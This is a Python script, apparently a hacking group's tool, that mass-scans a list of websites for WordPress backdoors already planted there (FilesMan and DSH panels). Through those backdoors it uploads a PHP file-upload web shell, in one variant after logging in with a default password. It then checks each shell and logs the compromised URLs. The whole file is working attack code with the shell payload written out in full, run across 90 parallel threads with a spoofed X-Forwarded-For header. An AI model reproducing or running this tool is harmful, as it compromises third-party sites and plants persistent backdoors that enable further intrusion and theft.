 # -*-coding:Latin-1 -*
 #JOIN https://t.me/xeonthread
import sys , requests, re, string, random, base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
    


# Coded By RxR HaCkEr

# here add shell you want
Content_shell = """<?php
echo '<b> XEON Was Here This some From My Tool </b></br><em>Only GIF, JPG, and PNG files are allowed.</em><center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="file_jpg" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>';

if (!empty ($_FILES['file_jpg'])) {   
	move_uploaded_file($_FILES['file_jpg']['tmp_name'],$_FILES['file_jpg']['name']); 
    Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['file_jpg']['name']."<br>size : ".$_FILES['file_jpg']['size']."<br>type : ".$_FILES['file_jpg']['type']; 
	
	
}  

?>"""

headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'X-Forwarded-For': '127.0.0.1',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string



def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site




def CheckInculde(url):
    try:
        
        Paths = ['/wp-content/plugins/WordPressCore/include.php', '/wp-content/plugins/core-plugin/include.php','/wp-includes/images/include.php','/wp-includes/widgets/include.php']
        
        for path in Paths:
        
            headers = {'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'X-Forwarded-For': '127.0.0.1',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}
            url = 'https://' + URLdomain(url)
            
            check = requests.get(url + path ,headers=headers , timeout=20 )
            if "value='FilesMan'>" in check.text:
                
                # #Exploit V1, V3
                includeRxV1(url, path)
                includeRxV3(url, path)
                open('Inculde-Vuln.txt', 'a').write(url + path +'\n')
                break    
            elif "<div><h5>DSH v0.1</h5>" in check.text:
                
                # Exploit V2
                includeRxV2(url, path)
                open('Inculde-Vuln.txt', 'a').write(url + path +'\n')
                break

            else:
                url = 'https://' + URLdomain(url)
                check1 = requests.get(url + path ,headers=headers , timeout=20 , verify=False)
                if "value='FilesMan'>" in check1.text:
                    
                    includeRxV1(url, path)
                    includeRxV3(url, path)
                    open('Inculde-Vuln.txt', 'a').write(url + path +'\n')
                    break

                elif '<div><h5>DSH v0.1</h5>' in check1.text:
                   
                    includeRxV2(url, path)
                    open('Inculde-Vuln.txt', 'a').write(url + path +'\n')
                    break
                else:
                    print ' -| ' + url + ' --> {}[Failed]'.format(fr)
               
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

def includeRxV1(url, Path):
    try:
    


    
        Filename = generate_random_string(8) + ".php"
        
        
        
        
        headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'X-Forwarded-For': '127.0.0.1',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}
        url = 'https://' + URLdomain(url)
        
        
        postData = {'a': 'FilesMan',
                    'c': '',
                    'p1': 'uploadFile',
                    'ne': '',
                    'charset': 'UTF-8'}
                    
        files = {'f[]': (Filename, Content_shell)}
        check = requests.post(url + Path,data=postData,files=files,headers=headers , timeout=20 )
        PathShell = Path.replace(Path.split("/")[-1], Filename)
        if "value='FilesMan'>" in check.text:
            shellWork =  requests.get(url + PathShell ,headers=headers, timeout=20 )
            if 'XEON' in shellWork.text:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('WordPressSh.txt', 'a').write(url + PathShell +'\n')
                    
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)

        else:
            url = 'https://' + URLdomain(url)
            check1 = requests.post(url + Path,data=postData,files=files,headers=headers, timeout=20 , verify=False)
            if "value='FilesMan'>" in check1.text:
                shellWork =  requests.get(url + PathShell ,headers=headers, timeout=20 , verify=False)
                if 'XEON' in shellWork.text:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('WordPressSh.txt', 'a').write(url + PathShell +'\n')
                    
                else:
                    print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
               
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        
        
        
def includeRxV2(url, Path):
    try:
        url = 'https://' + URLdomain(url)
        Filename = generate_random_string(8) + ".php"
        json_data = {
                    'a': 'FilesTools',
                    'c': '',
                    'p1': Filename,
                    'p2': 'touch',
                }
        post_data = {
                    'a': 'FilesTools',
                    'c': '',
                    'p1': Filename,
                    'p2': 'save',
                    'p3': Content_shell,
                }
                
        response1 = requests.post(url + Path, json=json_data, headers={'Content-Type': 'application/json','X-Forwarded-For':'127.0.0.1'})
        response2 = requests.post(url  + Path, json=post_data, headers={'Content-Type': 'application/json', 'X-Forwarded-For':'127.0.0.1'})
        PathShell = Path.replace(Path.split("/")[-1], Filename)
        check = requests.get(url + PathShell,headers=headers , timeout=20)
        if 'XEON' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('WordPressSh.txt', 'a').write(url + PathShell +'\n')
        else:
            url = 'http://' + URLdomain(url)
            response3 = requests.post(url + Path, json=json_data, headers={'Content-Type': 'application/json','X-Forwarded-For':'127.0.0.1'}, verify=False)
            response4 = requests.post(url + Path, json=post_data, headers={'Content-Type': 'application/json', 'X-Forwarded-For':'127.0.0.1'}, verify=False)
            check1 = requests.get(url + PathShell,headers=headers,timeout=20, verify=False)
            if 'XEON' in check1.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('WordPressSh.txt', 'a').write(url + PathShell +'\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        
        
def includeRxV3(url, Path):
    try:
    


    
        Filename = generate_random_string(8) + ".php"
        
        
        
        
        headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'X-Forwarded-For': '127.0.0.1',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}
        url = 'https://' + URLdomain(url)
        session = requests.Session()
        session.verify = False
        
        password_value = 'admin'

        # Prepare form data
        form_data = {
            'pass': password_value
        }

        # Send a POST request to the action URL with the form data
        response = session.post(url + Path, data=form_data, headers=headers, timeout=20)
        postData = {'a': 'FilesMan', 'c': '', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
                    
        files = {'f[]': (Filename, Content_shell)}
        check = session.post(url + Path,data=postData,files=files,headers=headers , timeout=20 )
        PathShell = Path.replace(Path.split("/")[-1], Filename)
        if "value='FilesMan'>" in check.text:
            shellWork =  requests.get(url + PathShell,headers=headers, timeout=20 )
            if 'XEON' in shellWork.text:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('WordPressSh.txt', 'a').write(url+ PathShell +'\n')
                    
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)

        else:
            url = 'https://' + URLdomain(url)
            response = session.post(url + Path, data=form_data, headers=headers, timeout=20)
            check1 = session.post(url + Path,data=postData,files=files,headers=headers, timeout=20 , verify=False)
            if "value='FilesMan'>" in check1.text:
                shellWork =  requests.get(url + PathShell ,headers=headers, timeout=20 , verify=False)
                if 'XEON' in shellWork.text:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('WordPressSh.txt', 'a').write(url + PathShell +'\n')
                    
                else:
                    print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
               
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(90)
mp.map(CheckInculde, target)
mp.close()
mp.join()